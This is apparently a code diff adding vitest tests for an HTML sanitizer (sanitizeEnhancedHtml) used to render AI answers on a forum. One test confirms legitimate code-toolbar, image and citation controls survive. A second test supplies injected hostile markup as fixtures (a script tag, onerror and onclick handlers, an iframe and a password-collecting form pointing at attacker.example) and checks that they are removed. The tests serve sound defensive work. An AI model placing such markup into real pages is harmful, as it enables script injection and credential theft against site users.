@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { normalizeAssistantMarkup, sanitizeAndParse, splitStreamingMarkdown } from '../utils/helpers';
+import { normalizeAssistantMarkup, sanitizeAndParse, sanitizeEnhancedHtml, splitStreamingMarkdown } from '../utils/helpers';
 
 describe('sanitizeAndParse security boundary', () => {
   it('renders hostile raw HTML as inert text and blocks attacker-controlled image requests', () => {
@@ -515,5 +515,55 @@ describe('citation extraction scope and cost', () => {
     // The label pattern is ~O(n^2) from every start position; without the
     // length cap this input measured ~100ms at half this size.
     expect(elapsedMs).toBeLessThan(25);
+  });
+});
+
+describe('sanitizeEnhancedHtml second pass', () => {
+  it('keeps the app-generated code tool, answer image, and citation controls', () => {
+    const enhanced = [
+      '<div class="wf-code-block"><div class="wf-code-toolbar">',
+      '<span class="wf-code-language">powershell</span>',
+      '<span class="wf-code-actions">',
+      '<button type="button" class="" data-code-action="wrap" aria-label="Toggle code wrapping" aria-pressed="false">Wrap</button>',
+      '<button type="button" data-code-action="copy" aria-label="Copy code">Copy</button>',
+      '</span></div><pre><code>Get-Process</code></pre></div>',
+      '<img class="wf-answer-image" src="https://windowsforum.com/images/ai/answers/x.webp" tabindex="0" role="button" aria-label="Open image: x">',
+      '<sup><button type="button" class="wf-inline-citation" data-source-index="2" aria-label="Go to source 2" title="Go to source 2">[2]</button></sup>',
+    ].join('');
+
+    const rendered = document.createElement('div');
+    rendered.innerHTML = sanitizeEnhancedHtml(enhanced);
+
+    const actions = rendered.querySelectorAll('button[data-code-action]');
+    expect(actions).toHaveLength(2);
+    expect(rendered.querySelector('div.wf-code-block')).not.toBeNull();
+    expect(rendered.querySelector('button[aria-pressed="false"]')).not.toBeNull();
+    const image = rendered.querySelector('img.wf-answer-image');
+    expect(image?.getAttribute('tabindex')).toBe('0');
+    expect(image?.getAttribute('role')).toBe('button');
+    const citation = rendered.querySelector('button[data-source-index]');
+    expect(citation?.getAttribute('data-source-index')).toBe('2');
+    expect(citation?.getAttribute('aria-label')).toBe('Go to source 2');
+  });
+
+  it('strips hostile markup injected after the enhancement stage', () => {
+    const injected = [
+      '<div class="wf-code-block">safe</div>',
+      '<script>window.__pwned = true;</script>',
+      '<img src="https://windowsforum.com/images/ai/answers/x.webp" onerror="window.__pwned = true">',
+      '<button type="button" onclick="window.__pwned = true" data-code-action="copy">Copy</button>',
+      '<iframe src="https://attacker.example/frame"></iframe>',
+      '<form action="https://attacker.example/collect"><input name="password"></form>',
+      '<span style="position:fixed;inset:0" onclick="steal()">styled</span>',
+    ].join('');
+
+    const rendered = document.createElement('div');
+    rendered.innerHTML = sanitizeEnhancedHtml(injected);
+
+    expect(rendered.querySelector('script, iframe, form, input')).toBeNull();
+    expect(rendered.querySelector('[onclick], [onerror], [style]')).toBeNull();
+    expect(rendered.textContent).not.toContain('window.__pwned');
+    // Legitimate controls in the same document still work.
+    expect(rendered.querySelector('button[data-code-action="copy"]')).not.toBeNull();
   });
 });
